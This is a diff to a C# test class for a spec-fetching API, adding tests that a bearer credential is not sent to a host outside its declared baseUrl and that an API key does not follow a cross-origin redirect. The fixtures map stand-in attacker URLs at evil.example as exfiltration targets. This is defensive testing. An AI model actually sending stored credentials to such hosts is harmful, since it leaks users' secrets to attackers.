@@ -140,19 +140,41 @@ public sealed class ControlPlaneSourceFetchApiTests
             {
                 stubRef = stub;
                 stub.Map("https://specs.example/private.json", 200, "application/json", PetstoreJson);
+                stub.Map("https://evil.example/x.json", 200, "application/json", PetstoreJson);
             });
 
-            // Register the credential through the public surface, then fetch with its reference.
+            // The credential is scoped to its declared baseUrl host; register it there.
             (await host.SendJsonAsync(
                 HttpMethod.Post, "/credentials",
-                """{"sourceName":"petstore","environment":"production","authKind":"bearer","secretRefs":[{"name":"value","ref":"env://ARAZZO_FETCH_TEST_TOKEN"}]}""",
+                """{"sourceName":"petstore","environment":"production","authKind":"bearer","secretRefs":[{"name":"value","ref":"env://ARAZZO_FETCH_TEST_TOKEN"}],"config":[{"key":"baseUrl","value":"https://specs.example"}]}""",
                 "credentials:write")).StatusCode.ShouldBe(HttpStatusCode.Created);
 
+            // A fetch from the credential's OWN host carries the bearer.
             (await host.SendJsonAsync(
                 HttpMethod.Post, "/sources/fetch",
                 """{"url":"https://specs.example/private.json","auth":{"binding":{"sourceName":"petstore","environment":"production"}}}""",
                 Read)).StatusCode.ShouldBe(HttpStatusCode.OK);
             stubRef!.LastAuthorization.ShouldBe("Bearer sekret-token");
+
+            // The workload binding is NOT presented to another host: the fetch refuses before any
+            // outbound request, so the shared secret cannot be exfiltrated to an attacker URL.
+            HttpResponseMessage exfil = await host.SendJsonAsync(
+                HttpMethod.Post, "/sources/fetch",
+                """{"url":"https://evil.example/x.json","auth":{"binding":{"sourceName":"petstore","environment":"production"}}}""",
+                Read);
+            exfil.StatusCode.ShouldBe(HttpStatusCode.BadRequest);
+            (await exfil.Content.ReadAsStringAsync()).ShouldContain("credential-host-not-allowed");
+            stubRef.Requests.Any(r => r.Url.Contains("evil.example")).ShouldBeFalse("the credential fetch never reached the attacker host");
+
+            // A binding with no baseUrl cannot be scoped, so it cannot fetch at all.
+            (await host.SendJsonAsync(
+                HttpMethod.Post, "/credentials",
+                """{"sourceName":"nobase","environment":"production","authKind":"bearer","secretRefs":[{"name":"value","ref":"env://ARAZZO_FETCH_TEST_TOKEN"}]}""",
+                "credentials:write")).StatusCode.ShouldBe(HttpStatusCode.Created);
+            (await host.SendJsonAsync(
+                HttpMethod.Post, "/sources/fetch",
+                """{"url":"https://specs.example/private.json","auth":{"binding":{"sourceName":"nobase","environment":"production"}}}""",
+                Read)).StatusCode.ShouldBe(HttpStatusCode.BadRequest);
 
             // An unknown reference is non-disclosing.
             (await host.SendJsonAsync(
@@ -164,6 +186,30 @@ public sealed class ControlPlaneSourceFetchApiTests
         {
             System.Environment.SetEnvironmentVariable("ARAZZO_FETCH_TEST_TOKEN", null);
         }
+    }
+
+    [TestMethod]
+    public async Task A_credential_is_not_carried_across_a_cross_origin_redirect()
+    {
+        StubHttpHandler? stubRef = null;
+        await using Scoped host = await StartAsync(stub =>
+        {
+            stubRef = stub;
+            stub.MapRedirect("https://portal.example/spec.json", "https://evil.example/spec.json");
+            stub.Map("https://evil.example/spec.json", 200, "application/json", PetstoreJson);
+        });
+
+        // A one-shot API key on a URL that redirects to another origin: the fetcher follows the
+        // redirect but the key rides only the origin it was meant for, never the redirect target.
+        (await host.SendJsonAsync(
+            HttpMethod.Post, "/sources/fetch",
+            """{"url":"https://portal.example/spec.json","auth":{"secret":{"scheme":"apiKey","header":"X-API-Key","value":"leak-me"}}}""",
+            Read)).StatusCode.ShouldBe(HttpStatusCode.OK);
+
+        (string Url, string? Authorization, string? ApiKey) toPortal = stubRef!.Requests.Single(r => r.Url.Contains("portal.example"));
+        (string Url, string? Authorization, string? ApiKey) toEvil = stubRef.Requests.Single(r => r.Url.Contains("evil.example"));
+        toPortal.ApiKey.ShouldBe("leak-me", "the key rides the origin it was meant for");
+        toEvil.ApiKey.ShouldBeNull("the key must NOT cross the redirect to another origin");
     }
 
     [TestMethod]
@@ -216,19 +262,37 @@ public sealed class ControlPlaneSourceFetchApiTests
         return new Scoped(app, app.GetTestClient());
     }
 
-    /// <summary>A canned outbound endpoint: URL → (status, content type, body), recording the last Authorization header.</summary>
+    /// <summary>A canned outbound endpoint: URL → (status, content type, body) or a redirect, recording every
+    /// request's URL and the credential headers it carried (a custom handler never auto-redirects, so the
+    /// fetcher's own redirect handling is what is exercised).</summary>
     private sealed class StubHttpHandler : HttpMessageHandler
     {
         private readonly Dictionary<string, (int Status, string ContentType, string Body)> responses = [];
+        private readonly Dictionary<string, string> redirects = [];
 
         public string? LastAuthorization { get; private set; }
 
+        public List<(string Url, string? Authorization, string? ApiKey)> Requests { get; } = [];
+
         public void Map(string url, int status, string contentType, string body) => this.responses[url] = (status, contentType, body);
+
+        public void MapRedirect(string url, string location) => this.redirects[url] = location;
 
         protected override Task<HttpResponseMessage> SendAsync(HttpRequestMessage request, CancellationToken cancellationToken)
         {
+            string url = request.RequestUri!.ToString();
             this.LastAuthorization = request.Headers.Authorization?.ToString();
-            if (!this.responses.TryGetValue(request.RequestUri!.ToString(), out (int Status, string ContentType, string Body) canned))
+            string? apiKey = request.Headers.TryGetValues("X-API-Key", out System.Collections.Generic.IEnumerable<string>? values) ? string.Join(",", values) : null;
+            this.Requests.Add((url, this.LastAuthorization, apiKey));
+
+            if (this.redirects.TryGetValue(url, out string? location))
+            {
+                var redirect = new HttpResponseMessage(HttpStatusCode.Found);
+                redirect.Headers.Location = new Uri(location);
+                return Task.FromResult(redirect);
+            }
+
+            if (!this.responses.TryGetValue(url, out (int Status, string ContentType, string Body) canned))
             {
                 return Task.FromResult(new HttpResponseMessage(HttpStatusCode.NotFound));
             }
